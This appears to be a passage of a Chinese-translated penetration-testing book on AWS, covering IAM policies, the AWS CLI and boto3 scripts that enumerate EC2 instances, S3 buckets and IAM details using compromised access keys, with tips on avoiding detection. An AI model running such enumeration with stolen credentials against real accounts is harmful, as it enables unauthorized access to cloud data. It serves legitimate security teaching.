策略及其支持的键将在下一节中更详细地描述，但基本上，这个 JSON 文档表示 EC2 服务（主体）被允许（效果）在针对此角色时运行`sts:AssumeRole`操作。主体还可以包括 IAM 用户、其他 AWS 服务或其他 AWS 账户。这意味着您可以假定跨账户角色，这是攻击者在账户中建立持久性的常见方式。这将在第十一章中进一步描述，*使用 Boto3 和 Pacu 维持 AWS 持久性*。我们现在将继续查看如何使用 IAM 策略限制 API 操作和可访问资源。

# 使用 IAM 策略限制 API 操作和可访问资源

IAM 策略是如何授予账户中的用户、角色和组权限的。它们是简单的 JSON 文档，指定了明确允许或拒绝的权限，这些权限可以/不能在哪些资源上使用，以及这些规则适用的条件。我们可以使用这些来在我们的 AWS 环境中执行细粒度的权限模型。

# IAM 策略结构

以下的 JSON 文档是一个示例，用来描述 IAM 策略文档的一些关键特性：

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "MyGeneralEC2Statement"
            "Effect": "Allow",
            "Action": "ec2:*",
            "Resource": "*"
        },
        {
            "Effect": "Allow",
            "Action": [
                "iam:GetUser"
            ],
            "Resource": "arn:aws:iam::123456789012:user/TestUser"
        },
        {
            "Effect": "Allow",
            "Action": "sts:AssumeRole",
            "Resource": "*",
            "Condition": {
                "Bool": {
                    "aws:MultiFactorAuthPresent": "true"
                }
            }
        }
    ]
}
```

这个策略包含了 IAM 策略的一些最常见的特性。首先，我们有`Version`键，它指定了正在使用的策略语言的版本。最佳实践是使用最新版本，目前是`2012-10-17`，除此之外不需要考虑太多。

接下来，我们有`Statement`键，它是一个称为语句的 JSON 对象列表。语句是关于权限和与之相关的设置的单独声明。一个语句可以包括`Sid`、`Effect`、`Action`、`NotAction`、`Principal`、`Resource`和`Condition`键。

`Sid`是一个可选字段，是您选择的字符串，用于帮助区分策略中不同的语句。它不需要被提供，但如果提供了，它基本上只是为了让读者更容易理解策略。在前面的策略中，`MyGeneralEC2Statement` Sid 旨在表明该语句是 EC2 服务的一般语句。

`Effect`键是一个必需的字段，可以设置为`Allow`或`Deny`，它声明了列出的 AWS 权限（在`Action`或`NotAction`下）是显式允许还是显式拒绝的。在前面示例策略中的所有语句都明确允许相关权限。

`Action`或`NotAction`中的一个键是必需的，它包含一组 AWS 权限。几乎每次都会看到`Action`被使用而不是`NotAction`。在前面示例策略中的第一个语句明确允许了`ec2:*`操作，使用了 IAM 策略的通配符字符（`*`）。

权限以`[AWS 服务]:[权限]`的格式设置，因此`ec2:*`权限指定了与 AWS EC2 服务相关的每个权限（例如`ec2:RunInstances`和`ec2:CopyImage`）。通配符字符可以在 IAM 策略的各个地方使用，比如在以下权限中：`ec2:Describe*`。这将代表以`Describe`开头的每个 EC2 权限（例如`ec2:DescribeInstances`和`ec2:DescribeImages`）。`NotAction`稍微复杂一些，但基本上它们是`Action`的相反。这意味着`NotAction ec2:Modify*`将代表除了以`Modify`开头的所有 EC2 权限之外的所有 AWS 服务的每个 API 调用（例如`ec2:ModifyVolume`和`ec2:ModifyHosts`）。

`Principal`键适用于不同类型的 IAM 策略，超出了我们到目前为止所看到的内容（例如在上一节中的假定角色策略文档）。它代表了该语句所适用的资源，但它在用户、角色和组的权限策略中是自动隐含的，所以我们现在将跳过它。

`Resource`键是一个必需的字段，是指定在`Action`/`NotAction`部分下指定的权限适用于哪些 AWS 资源的列表。这个值通常只被指定为通配符字符，代表任何 AWS 资源，但对于大多数 AWS 权限来说，最佳实践是将其锁定到必须使用的资源。在我们的示例策略中列出的第二个语句中，我们将资源列为`arn:aws:iam::123456789012:user/TestUser`，这是帐户中用户的 ARN，帐户 ID 为`123456789012`，用户名为`TestUser`。这意味着我们只允许（效果）对帐户中具有`123456789012` ID 和`TestUser`用户名的用户执行`iam:GetUser` API 调用（操作）（资源）。请注意，尽管资源中列出了帐户 ID，但许多 API 调用不能用于属于不同 AWS 帐户的资源，即使通配符存在，而不是帐户 ID。

“条件”键是一个可选字段，指示规则说明适用的条件。在我们之前的示例的第三个语句中，我们有一个名为`aws:MultiFactorAuthPresent`的`Bool`条件（布尔值，即`true`/`false`）设置为 true。这意味着对于这个语句适用（允许在任何资源上使用`sts:AssumeRole`权限），用户/角色必须使用 AWS 进行多因素身份验证；否则，该权限是不允许的。还有许多其他可以指定的条件，比如要求任何 API 调用需要特定的源 IP 地址，要求 API 调用在特定时间范围内进行，以及许多其他条件（参见[`docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html`](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html)）。

# IAM 策略的目的和用途

作为攻击者，了解 IAM 策略的工作原理很重要，因为一旦您能够阅读它们，您就可以确定对环境有什么样的访问权限，以及为什么您进行的某些 API 调用会因为访问被拒绝而失败，即使看起来它们应该被允许。可能是您正在攻击未在策略中指定的资源，您没有进行多因素身份验证，或者可能是其他各种原因。

当我们在攻击中检查受损密钥时，我们喜欢看到以下的语句：

```
{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
}
```

这个语句给了我们管理员级别的权限。因为它允许使用`*`权限，并且因为`"*"`字符是通配符，这意味着任何与 AWS 服务相关的权限都是允许的。资源也是通配符，所以我们可以对目标账户中的任何资源运行任何 API 调用。有一个具有这些权限的 AWS 托管 IAM 策略，称为`AdministratorAccess`策略。该策略的 ARN 是`arn:aws:iam::aws:policy/AdministratorAccess`。

在测试时管理用户的权限，您可以将 IAM 策略附加到您的用户、角色或组，以提供或拒绝策略中设置的权限。到目前为止，我们已经看到的策略类型可以被重用并附加到多种不同类型的资源上。例如，同一个 IAM 策略可以同时附加到用户、组和/或角色上。

还存在内联策略，与托管策略不同，内联策略不是独立资源，而是直接创建在用户、角色或组上。内联策略不能像托管策略那样被重用，因此，安全最佳实践是尽量避免使用内联策略。作为攻击者，我们可以出于几种不同的恶意原因使用它们，但因为它们只适用于单个资源，所以在攻击中创建一个内联策略时更加隐蔽。它们的工作方式与托管策略相同，但需要一组不同的权限来进行交互。有时，您可能会发现受损的用户/角色可能具有使用内联策略但没有使用托管策略的权限，或者反之。

以下截图来自 AWS Web 控制台，显示了我设置的一个 IAM 用户，该用户既有一个托管策略（AmazonEC2FullAccess），又有一个内联策略（TestPolicy）附加：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/fe977450-8419-43ae-a3ce-7e30c88481bc.png)

AWS 托管策略和附加到 IAM 用户的内联策略

# 使用 IAM 访问密钥

现在我们已经创建了一个用户和访问密钥，并了解了 IAM 策略的工作原理，是时候让它们发挥作用，进行一些 AWS API 调用了：

1.  首先，让我们安装 AWS **命令行界面**（**CLI**）。最简单的方法（如果您的计算机上已安装 Python 和`pip`）是运行以下`pip`命令：

```
pip install awscli --upgrade --user
```

1.  然后，您可以通过运行以下命令来检查安装是否成功：

```
aws --version
```

有关您操作系统的更具体说明，请访问：[`docs.aws.amazon.com/cli/latest/userguide/installing.html`](https://docs.aws.amazon.com/cli/latest/userguide/installing.html)。

1.  要将用户凭据添加到 AWS CLI 中，以便我们可以进行 API 调用，我们可以运行以下命令，将我们的凭据存储在`Test`配置文件下（请注意，配置文件允许您从命令行管理多组不同的凭据）：

```
aws configure --profile Test
```

1.  您将被提示输入一些不同的值，包括您的访问密钥 ID 和秘密密钥，这是我们在之前创建我们的`Test`用户后呈现的。然后，您将被要求输入默认区域名称，在我们的示例中，我们将选择`us-west-2`（俄勒冈）区域。最后，您将被要求输入默认输出格式。我们将选择`json`作为我们的默认格式，但还有其他可用的值，如`table`。以下截图显示了我们在新安装的 AWS CLI 中为`Test`配置文件设置凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a505a9b8-629b-48db-8212-7b50c0138d7a.png)

使用我们新创建的凭据创建 Test 配置文件

我们的新配置文件现在将存储在 AWS CLI 凭据文件中，该文件位于以下文件中：`~/.aws/credentials`。

1.  更新该配置文件的凭据/设置，您可以再次运行相同的命令，并在您获取新的凭据时，只需将配置文件的名称从`Test`更改为适合您添加的密钥的名称。现在我们已经安装了 AWS CLI 并设置了我们的`Test`配置文件，开始使用我们的凭据非常简单。需要记住的一件事是，因为我们使用 AWS CLI 配置文件，您需要记住在所有 AWS CLI 命令中包含`--profile Test`参数，以便使用正确的凭据进行 API 调用。

1.  一个非常有用的命令是由**安全令牌服务**（**STS**）提供的`GetCallerIdentity` API（[`docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html`](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetCallerIdentity.html)）。这个 API 调用提供给每个 AWS 用户和角色，不能通过 IAM 策略拒绝。这允许我们使用此 API 来枚举有关我们密钥的一些常见账户信息的方法。继续运行以下命令：

```
aws sts get-caller-identity --profile Test
```

您应该看到以下截图的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f53cde88-ba2f-4da3-bafe-cf54e3ff9e0a.png)

从我们的 Test 配置文件运行 sts:GetCallerIdentity 命令

输出包括当前用户的用户 ID、账户 ID 和 ARN。用户 ID 是您在 API 后端引用用户的方式，通常在我们进行 API 调用时不需要。账户 ID 是此用户所属账户的 ID。

在您有账户 ID 的情况下，有方法可以枚举账户中存在的用户和角色，而不会在目标账户中创建日志，但这种攻击通常在后期利用场景中并不是非常有用，更有助于社会工程。当前用户的**Amazon 资源名称**（**ARN**）包括账户 ID 和用户名。

我们使用 AWS CLI 进行的所有其他 API 调用都将以类似的方式运行，并且大多数 AWS 服务都受到 AWS CLI 的支持。列出您可以定位和引用的服务以及如何引用它们的一个小技巧是运行以下命令：

```
aws a
```

基本上，这个命令尝试定位`a`服务，但因为那不是一个真实的服务，AWS CLI 将打印出所有可用的服务，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/fbcab712-8da7-4653-9e81-fe05089d573a.png)

运行 AWS CLI 命令针对无效服务列出可用服务

这个技巧也可以用来列出每个服务的可用 API。假设我们知道我们想要针对 EC2 服务，但我们不知道我们想要运行的命令的名称。我们可以运行以下命令：

```
aws ec2 a
```

这将尝试运行`a` EC2 API 调用，但这个调用不存在，所以 AWS CLI 将打印出您可以选择的所有有效 API 调用，就像您在以下截图中看到的那样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/fb4bd6a5-0f0c-41bf-b048-82ee66473d16.png)

运行无效的 AWS CLI 命令以列出我们目标服务（EC2）支持的命令

有关 AWS 服务或 API 调用的更多信息，例如描述，限制和支持的参数，我们可以使用`help`命令。对于 AWS 服务，您可以使用以下命令：

```
aws ec2 help
```

对于特定的 API 调用，您可以使用以下命令：

```
aws ec2 describe-instances help
```

为了完成本节，让我们使用之前附加到我们用户的 AmazonEC2FullAccess 策略：

1.  如果我们想要列出默认区域（我们之前选择了`us-west-2`）中的所有实例，我们可以运行以下命令：

```
aws ec2 describe-instances --profile Test
```

如果您的帐户中没有运行任何 EC2 实例，您可能会看到类似以下截图中显示的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ececbc77-236d-4d6c-b1bf-d59b798eeab0.png)

尝试描述目标区域没有任何 EC2 实例的结果

1.  如果没有指定区域，那么将自动针对`us-west-2`区域进行目标，因为我们在设置凭据时将其作为默认输入。这可以通过使用`--region`参数手动每个 API 调用来完成，就像以下命令中那样：

```
aws ec2 describe-instances --region us-east-1 --profile Test
```

我们的测试帐户在`us-east-1`中运行了一个 EC2 实例，所以这次输出将会有所不同。它将看起来像以下截图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/284bc53f-a16c-475a-823c-ccb05492d8ba.png)

在`us-east-1`区域描述 EC2 实例时返回的部分输出

数据将以 JSON 格式返回，因为这是我们在设置凭据时指定的默认格式。它将包括许多与在区域和目标帐户中找到的 EC2 实例相关的信息，例如实例 ID，实例大小，用于启动实例的映像，网络信息等等。

这些信息的各个部分可以被收集和在后续请求中重复使用。其中一个例子是注意到每个实例附加了哪些 EC2 安全组。您将获得安全组的名称和 ID，然后可以在尝试描述应用于这些组的防火墙规则的请求中使用它们。

1.  在我们的`ec2:DescribeInstances`调用结果中，我们可以看到`sg-0fc793688cb3d6050`安全组附加到我们的实例。我们可以通过将该 ID 输入`ec2:DescribeSecurityGroups` API 调用来获取有关此安全组的信息，就像以下命令中那样：

```
aws ec2 describe-security-groups --group-ids sg-0fc793688cb3d6050 --region us-east-1 --profile Test
```

现在，我们展示了应用于我们之前描述的实例的入站和出站防火墙规则。以下截图显示了命令和一些应用于我们实例的入站流量规则：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e0b54b40-0acb-4cac-ae8c-ef070319860d.png)

命令和一些入站流量规则

我们可以看到，在`IpPermissions`键下，允许从任何 IP 地址（`0.0.0.0/0`）对端口 22 的入站访问。在截图中未显示的是`IpPermissionsEgress`键，该键指定了从 EC2 实例发出的出站流量的规则。

# 手动签署 AWS API 请求

大多数 AWS API 调用在发送到 AWS 服务器之前都需要对其中的某些数据进行签名。这是出于几个不同的原因，比如允许服务器验证 API 调用者的身份，保护数据在传输到 AWS 服务器时免受修改，并防止重放攻击，即攻击者拦截您的请求并自行运行它。默认情况下，签名请求有效期为五分钟，因此在这五分钟窗口关闭之前，如果请求被拦截并重新发送，重放攻击是可能的。AWS CLI 和 AWS SDK（例如`boto3` Python 库）会自动处理所有请求签名，因此您无需考虑这些问题。

然而，有一些情况下您可能需要手动签署 API 请求，因此本节将简要概述如何进行操作。您需要这样做的唯一真正情况是，如果您使用的编程语言没有 AWS SDK，或者您希望完全控制发送到 AWS 服务器的请求。支持两个版本的签名（v2 和 v4），但对于我们的用例，我们几乎总是使用 v4。

有关签署请求和具体信息，请访问 AWS 文档的以下链接：[`docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html`](https://docs.aws.amazon.com/general/latest/gr/signing_aws_api_requests.html)。

基本上，使用签名 v4 手动签署 AWS API 请求的过程包括四个独立的步骤：

1.  创建规范请求

1.  创建要签名的字符串

1.  计算该字符串的签名

1.  将该签名添加到您的 HTTP 请求

AWS 文档中有一些很好的示例，说明如何进行这个过程。

以下链接包含示例 Python 代码，展示了整个过程并解释了每个步骤：[`docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html`](https://docs.aws.amazon.com/general/latest/gr/sigv4-signed-request-examples.html)。

# 总结

在本章中，我们介绍了 IAM 服务的一些基础知识，如 IAM 用户、角色和组。我们还研究了如何使用 IAM 策略来限制环境中的权限，以及 IAM 用户访问密钥和 AWS CLI。此外，还介绍了手动签署 AWS HTTP 请求的信息，以备您偶尔需要时使用。

这些基础主题将在本书中不断出现，因此重要的是要对 AWS IAM 服务有一个牢固的掌握。本章中我们没有涵盖 IAM 服务的更多功能、复杂性和细节，但其中一些更重要的内容将在本书的其他章节中单独讨论。本章内容的主要目的是为您在以后深入学习 AWS 的更高级主题和服务时提供知识基础。

在下一章中，我们将研究如何使用 AWS 的`boto3` Python 库和窃取的访问密钥来枚举我们自己的权限，以及将它们提升到管理员级别！我们还将介绍 Pacu，这是一个 AWS 利用工具包，它已经自动化了许多这些攻击过程，并使您更容易自动化它们。权限枚举和特权提升对于 AWS 渗透测试至关重要，所以做好准备！


# 第十章：使用窃取的密钥、Boto3 和 Pacu 提升 AWS 账户的特权

AWS 环境渗透测试的一个重要方面是枚举用户的权限，并在可能的情况下提升这些特权。知道你可以访问什么是第一场战斗，它将允许你在环境中制定攻击计划。接下来是特权升级，如果你可以进一步访问环境，你可以执行更具破坏性的攻击。在本章中，我们将深入研究 Python 的`boto3`库，学习如何以编程方式进行 AWS API 调用，学习如何使用它来自动枚举我们的权限，最后学习如何使用它来提升我们的权限，如果我们的用户容易受到提升攻击。

枚举我们的权限对于多种原因非常重要。其中之一是我们将避免需要猜测我们的权限是什么，从而在过程中防止许多访问被拒绝的错误。另一个是它可能披露有关环境其他部分的信息，比如如果特定资源在我们的**身份和访问管理**（**IAM**）策略中被标记，那么我们就知道该资源正在使用，并且在某种程度上很重要。此外，我们可以将我们的权限列表与已知的特权升级方法列表进行比较，以查看是否可以授予自己更多访问权限。我们可以获得对环境的更多访问权限，攻击的影响就越大，如果我们是真正的恶意攻击者而不是渗透测试人员，我们的攻击就会更加危险。

在本章中，我们将涵盖以下主题：

+   使用`boto3`库进行侦察

+   转储所有账户信息

+   使用受损的 AWS 密钥进行权限枚举

+   特权升级和使用 Pacu 收集凭据

# 权限枚举的重要性

无论如何，无论您是否可以提升权限，拥有确切的权限列表都非常重要。这可以节省您在攻击环境时的大量时间，因为您不需要花时间尝试猜测您可能拥有的访问权限，而是可以进行离线手动分析，以留下更小的日志记录。通过了解您拥有的访问权限，您可以避免运行测试命令以确定您是否具有特权的需要。这是有益的，因为 API 错误，特别是访问被拒绝的错误，可能会非常嘈杂，并且很可能会警告防御者您的活动。

在许多情况下，您可能会发现您的用户没有足够的权限来枚举他们的全部权限。在这些情况下，通常建议根据您已经拥有的信息做出假设，比如密钥是从哪里检索到的。也许你从一个上传文件到`S3`的 Web 应用程序中获得了这些受损的密钥。可以安全地假设这些密钥有权限上传文件到`S3`，并且它们也可能具有读取/列出权限。这组密钥很可能无法访问 IAM 服务，因此进行 IAM API 调用可能会相当嘈杂，因为它很可能会返回访问被拒绝的错误。但这并不意味着你永远不应该尝试这些权限，因为有时这是你唯一的选择，你可能需要在账户中制造一些噪音，以找出接下来的步骤。

# 使用 boto3 库进行侦察

Boto3 是 Python 的 AWS 软件开发工具包（SDK），可以在这里找到：[`boto3.amazonaws.com/v1/documentation/api/latest/index.html`](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)。它提供了与 AWS API 交互的接口，意味着我们可以以编程方式自动化和控制我们在 AWS 中所做的事情。它由 AWS 管理，因此会不断更新最新的 AWS 功能和服务。它还用于 AWS 命令行界面（CLI）的后端，因此与其在代码中运行 AWS CLI 命令相比，与这个库进行交互更有意义。

因为我们将使用 Python 来编写我们的脚本，`boto3`是与 AWS API 进行交互的完美选择。这样，我们就可以自动化我们的侦察/信息收集阶段，很多额外的工作已经被处理了（比如对 AWS API 的 HTTP 请求进行签名）。我们将使用 AWS API 来收集有关目标账户的信息，从而确定我们对环境的访问级别，并帮助我们精确制定攻击计划。

本节将假定您已经安装了 Python 3 以及`pip`包管理器。

安装`boto3`就像运行一个`pip install`命令一样简单：

```
 pip3 install boto3 
```

现在`boto3`及其依赖项应该已经安装在您的计算机上。如果`pip3`命令对您不起作用，您可能需要通过 Python 命令直接调用`pip`，如下所示：

```
 python3 -m pip install boto3 
```

# 我们的第一个 Boto3 枚举脚本

一旦安装了`boto3`，它只需要被导入到您的 Python 脚本中。在本章中，我们将从以下声明自己为`python3`的 Python 脚本开始，然后导入`boto3`：

```
#!/usr/bin/env python3

import boto3

```

我们可以通过几种不同的方式来设置`boto3`的凭据，但我们将坚持只使用一种方法，那就是通过创建一个`boto3`的`session`来进行 API 调用（[`boto3.amazonaws.com/v1/documentation/api/latest/reference/core/session.html`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/core/session.html)）。

在上一章中，我们创建了 IAM 用户并将他们的密钥保存到了 AWS CLI 中，所以现在我们可以使用`boto3`来检索这些凭据并在我们的脚本中使用它们。我们将首先通过以下代码实例化一个`boto3`的`session`，用于`us-west-2`地区：

```
session = boto3.session.Session(profile_name='Test', region_name='us-west-2') 
```

这段代码创建了一个新的`boto3` `session`，并将在计算机上搜索名为`Test`的 AWS CLI 配置文件，这是我们已经设置好的。通过使用这种方法来处理我们脚本中的凭据，我们不需要直接在代码中包含硬编码的凭据。

现在我们已经创建了我们的 session，我们可以使用该 session 来创建`boto3`客户端，然后用于对 AWS 进行 API 调用。客户端在创建时接受多个参数来管理不同的配置值，但一般来说，我们只需要担心一个参数，那就是`service_name`参数。它是一个位置参数，将始终是我们传递给客户端的第一个参数。以下代码设置了一个新的`boto3`客户端，使用我们的凭据，目标是 EC2 AWS 服务：

```
   client = session.client('ec2')  
```

现在我们可以使用这个新创建的客户端来对 EC2 服务进行 AWS API 调用。

有关可用方法的列表，您可以访问`boto3`文档中的 EC2 参考页面：[`boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#client`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ec2.html#client)。

有许多方法可供选择，但为了信息枚举的目的，我们将从`describe_instances`方法开始，就像我们之前展示的那样（即在第九章的*在 AWS 上使用 IAM 访问密钥*部分中所示），使用 AWS CLI，将枚举目标区域中的 EC2 实例。我们可以运行此 API 调用并使用以下代码行检索结果：

```
   response = client.describe_instances() 
```

`describe_instances`方法接受一些可选参数，但对于我们进行的第一个调用，我们还不需要。这个方法的文档告诉我们，它支持分页。根据您要定位的账户中的 EC2 实例数量，您可能无法在第一次 API 调用中收到所有结果。我们可以通过创建一个单独的变量来存储所有枚举的实例，并检查结果是否完整来解决这个问题。

我们添加的上一行代码（`response = client.describe_instances()`）需要稍微重新排列一下，以便最终如下所示：

```
# First, create an empty list for the enumerated instances to be stored in
instances = []

# Next, make our initial API call with MaxResults set to 1000, which is the max
# This will ensure we are making as few API calls as possible
response = client.describe_instances(MaxResults=1000)

# The top level of the results will be "Reservations" so iterate through those
for reservation in response['Reservations']:
    # Check if any instances are in this reservation
    if reservation.get('Instances'):
        # Merge the list of instances into the list we created earlier
        instances.extend(reservation['Instances'])

# response['NextToken'] will be a valid value if we don't have all the results yet
# It will be "None" if we have completed enumeration of the instances
# So we need check if it has a valid value, and because this could happen again, we will need to make it a loop

# As long as NextToken has a valid value, do the following, otherwise skip it
while response.get('NextToken'):
    # Run the API call again while supplying the previous calls NextToken
    # This will get us the next page of 1000 results
    response = client.describe_instances(MaxResults=1000, NextToken=response['NextToken'])

    # Iterate the reservations and add any instances found to our variable again
    for reservation in response['Reservations']:
        if reservation.get('Instances'):
            instances.extend(reservation['Instances'])
```

现在我们可以确保即使在具有数千个 EC2 实例的大型环境中，我们也有完整的实例列表。

# 保存数据

现在我们有了 EC2 实例列表，但我们应该怎么处理呢？一个简单的解决方案是将数据输出到本地文件中，以便以后可以引用。我们可以通过导入`json` Python 库并将`instances`的内容转储到与我们的脚本相同的目录中的文件中来实现这一点。让我们将以下代码添加到我们的脚本中：

```
# Import the json library
import json

# Open up the local file we are going to store our data in
with open('./ec2-instances.json', 'w+') as f:
    # Use the json library to dump the contents to the newly opened file with some indentation to make it easier to read. Default=str to convert dates to strings prior to dumping, so there are no errors
    json.dump(instances, f, indent=4, default=str)
```

现在完整的脚本（不包括注释）应该如下所示：

```
#!/usr/bin/env python3

import boto3
import json

session = boto3.session.Session(profile_name='Test', region_name='us-west-2')
client = session.client('ec2')

instances = []

response = client.describe_instances(MaxResults=1000)

for reservation in response['Reservations']:
    if reservation.get('Instances'):
        instances.extend(reservation['Instances'])

while response.get('NextToken'):
    response = client.describe_instances(MaxResults=1000, NextToken=response['NextToken'])

    for reservation in response['Reservations']:
        if reservation.get('Instances'):
            instances.extend(reservation['Instances'])

with open('./ec2-instances.json', 'w+') as f:
    json.dump(instances, f, indent=4, default=str)
```

现在我们可以使用以下命令运行此脚本：

```
python3 our_script.py 
```

在当前目录中应该创建一个名为`ec2-instances.json`的新文件，当您打开它时，您应该看到类似以下截图的内容，其中列出了`us-west-2`区域中所有 EC2 实例的 JSON 表示。这些 JSON 数据包含有关 EC2 实例的基本信息，包括标识信息、网络信息和适用于 EC2 实例的其他配置。但是，这些细节目前并不重要：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/12e9ca4d-6999-4d21-9b92-f52d23776c29.png)

这个文件现在应该包含我们之前在代码中指定的区域中所有实例的枚举信息。

# 添加一些 S3 枚举

现在假设我们想要枚举账户中存在的`S3`存储桶以及这些存储桶中的文件。目前，我们的测试 IAM 用户没有`S3`权限，因此我已经直接将 AWS 托管策略`AmazonS3ReadOnlyAccess`附加到我们的用户上。如果您需要为自己的用户执行此操作，请参考第九章的*在 AWS 上使用身份访问管理*。

我们将在已经创建的现有脚本的底部添加以下代码。首先，我们将想要弄清楚账户中有哪些`S3`存储桶，因此我们需要设置一个新的`boto3`客户端来定位`S3`：

```
client = session.client('s3') 
```

然后，我们将使用`list_buckets`方法来检索账户中`S3`存储桶的列表。请注意，与`ec2:DescribeInstances` API 调用不同，`s3:ListBuckets` API 调用不是分页的，您可以期望在单个响应中看到账户中的所有存储桶：

```
response = client.list_buckets() 
```

返回的数据中包含一些我们目前不感兴趣的信息（例如存储桶创建日期），因此我们将遍历响应并仅提取存储桶的名称：

```
bucket_names = []
  for bucket in response['Buckets']:
       bucket_names.append(bucket['Name'])
```

现在我们已经知道账户中所有存储桶的名称，我们可以继续使用`list_objects_v2`API 调用列出每个存储桶中的文件。`list_objects_v2`API 调用是一个分页操作，因此可能不是每个对象都会在第一个 API 调用中返回给我们，因此我们将在脚本中考虑到这一点。我们将添加以下代码到我们的脚本中：

```
# Create a dictionary to hold the lists of object (file) names
bucket_objects = {}

# Loop through each bucket we found
for bucket in bucket_names:
    # Run our first API call to pull in the objects
    response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000)

    # Check if there are any objects returned (none will return if no objects are in the bucket)
    if response.get('Contents'):
        # Store the fetched set of objects
        bucket_objects[bucket] = response['Contents']
    else:
        # Set this bucket to an empty object and move to the next bucket
        bucket_objects[bucket] = []
        continue

    # Check if we got all the results or not, loop until we have everything if so
    while response['IsTruncated']:
        response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000, ContinuationToken=response['NextContinuationToken'])

        # Store the newly fetched set of objects
        bucket_objects[bucket].extend(response['Contents'])
```

当循环完成时，我们应该得到`bucket_objects`是一个字典，其中每个键是账户中的存储桶名称，它包含存储在其中的对象列表。

与我们将所有 EC2 实例数据转储到`ec2-instances.json`类似，我们现在将所有文件信息转储到多个不同的文件中，文件名是存储桶的名称。我们可以添加以下代码来实现：

```
# We know bucket_objects has a key for each bucket so let's iterate that
for bucket in bucket_names:
    # Open up a local file with the name of the bucket
    with open('./{}.txt'.format(bucket), 'w+') as f:
        # Iterate through each object in the bucket
        for bucket_object in bucket_objects[bucket]:
            # Write a line to our file with the object details we are interested in (file name and size)
            f.write('{} ({} bytes)\n'.format(bucket_object['Key'], bucket_object['Size']))
```

现在我们已经添加到原始脚本的最终代码应该如下（不包括注释）：

```
client = session.client('s3')

bucket_names = []

response = client.list_buckets()
for bucket in response['Buckets']:
    bucket_names.append(bucket['Name'])

bucket_objects = {}

for bucket in bucket_names:
    response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000)

    bucket_objects[bucket] = response['Contents']

    while response['IsTruncated']:
        response = client.list_objects_v2(Bucket=bucket, MaxKeys=1000, ContinuationToken=response['NextContinuationToken'])

        bucket_objects[bucket].extend(response['Contents'])

for bucket in bucket_names:
    with open('./{}.txt'.format(bucket), 'w+') as f:
        for bucket_object in bucket_objects[bucket]:
            f.write('{} ({} bytes)\n'.format(bucket_object['Key'], bucket_object['Size']))
```

现在我们可以使用与之前相同的命令再次运行我们的脚本：

```
python3 our_script.py 
```

当它完成时，它应该再次枚举 EC2 实例并将它们存储在`ec2-instances.json`文件中，现在账户中每个存储桶也应该有一个文件，其中包含其中所有对象的文件名和文件大小。以下屏幕截图显示了从我们的一个`test`存储桶中下载的信息的片段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1e52f85b-0308-4d24-9a49-a31bca5e6399.png)

现在我们知道哪些文件存在，我们可以尝试使用 AWS S3 API 命令`get_object`来下载听起来有趣的文件，但我会把这个任务留给你。请记住，数据传输会导致发生在 AWS 账户中的费用，因此通常不明智编写尝试下载存储桶中的每个文件的脚本。如果你这样做了，你可能会轻易地遇到一个存储了数百万兆字节数据的存储桶，并导致 AWS 账户产生大量意外费用。这就是为什么根据名称和大小选择要下载的文件是很重要的。

# 转储所有账户信息

AWS 使得可以通过多种方法（或 API）从账户中检索数据，其中一些方法比其他方法更容易。这对我们作为攻击者来说是有利的，因为我们可能被拒绝访问一个权限，但允许访问另一个权限，最终可以用来达到相同的目标。

# 一个新的脚本 - IAM 枚举

在这一部分，我们将从一个新的脚本开始，目标是枚举 IAM 服务和 AWS 账户的各种数据点。脚本将从我们已经填写的一些内容开始：

```
#!/usr/bin/env python3

import boto3

session = boto3.session.Session(profile_name='Test', region_name='us-west-2')
client = session.client('iam')
```

我们已经声明文件为`python3`文件，导入了`boto3`库，使用`us-west-2`区域`Test`配置文件中的凭据创建了我们的`boto3` `session`，然后使用这些凭据为 IAM 服务创建了一个`boto3`客户端。

我们将从`get_account_authorization_details`API 调用开始（[`boto3.amazonaws.com/v1/documentation/api/latest/reference/services/iam.html#IAM.Client.get_account_authorization_details`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/iam.html#IAM.Client.get_account_authorization_details)），该调用从账户中返回大量信息，包括用户、角色、组和策略信息。这是一个分页的 API 调用，因此我们将首先创建空列表来累积我们枚举的数据，然后进行第一个 API 调用：

```
# Declare the variables that will store the enumerated information
user_details = []
group_details = []
role_details = []
policy_details = []

# Make our first get_account_authorization_details API call
response = client.get_account_authorization_details()

# Store this first set of data
if response.get('UserDetailList'):
    user_details.extend(response['UserDetailList'])
if response.get('GroupDetailList'):
    group_details.extend(response['GroupDetailList'])
if response.get('RoleDetailList'):
    role_details.extend(response['RoleDetailList'])
if response.get('Policies'):
    policy_details.extend(response['Policies'])
```

然后我们需要检查响应是否分页，以及是否需要进行另一个 API 调用来获取更多结果。就像之前一样，我们可以使用一个简单的循环来做到这一点：

```
# Check to see if there is more data to grab
